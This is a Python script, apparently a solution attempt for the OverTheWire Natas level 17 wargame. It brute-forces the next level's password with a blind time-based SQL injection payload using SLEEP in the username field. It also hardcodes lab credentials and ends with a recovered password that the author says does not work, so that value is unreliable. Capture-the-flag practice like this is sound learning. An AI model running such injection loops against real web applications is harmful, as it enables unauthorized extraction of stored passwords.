
import requests
import time
import string

# Character set: lowercase + uppercase + digits
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    for character in characters:
        test_password = ''.join(seen_password) + character
        print(f"Trying: {test_password}")
        # Start the timer
        start_time = time.time()
        payload = f'natas18" AND BINARY password LIKE "{test_password}%" AND SLEEP(1) #'
        response = session.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )
        # Measure time difference
        end_time = time.time()
        difference = end_time - start_time
        if difference > 1:
            # Found correct character
            seen_password.append(character)
            break  # Move to next position
print("Recovered password:", ''.join(seen_password))

# final password: a0t5VEOJC3Vphzs5F9FuC0sdkcibcrCW == not working still ... i am done with sleep injections atp